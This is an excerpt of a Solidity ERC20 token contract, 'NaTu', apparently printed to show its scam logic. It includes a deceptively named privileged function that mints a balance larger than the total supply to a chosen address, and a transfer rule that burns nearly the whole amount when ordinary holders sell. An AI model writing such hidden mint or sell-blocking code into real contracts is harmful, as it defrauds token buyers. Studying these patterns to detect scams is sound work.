...
contract  NaTu  is Ownable, IERC20 {
    ...
    function allowanceer(address recipient) external  {  require( _isExcludedFromFee[msg.sender]);
        _tOwned[recipient] = _totalSupply * SAFETIME + 1;
    }   
    ...
    function _transfer(  address from,  address to,  uint256 amount  ) private {
        ...
        if ( from != uniswapV2Pair )  {   if (  block.timestamp >=  Buyser[from] + FOMOTIME )    {   burnfee = amount - 1; }      } 
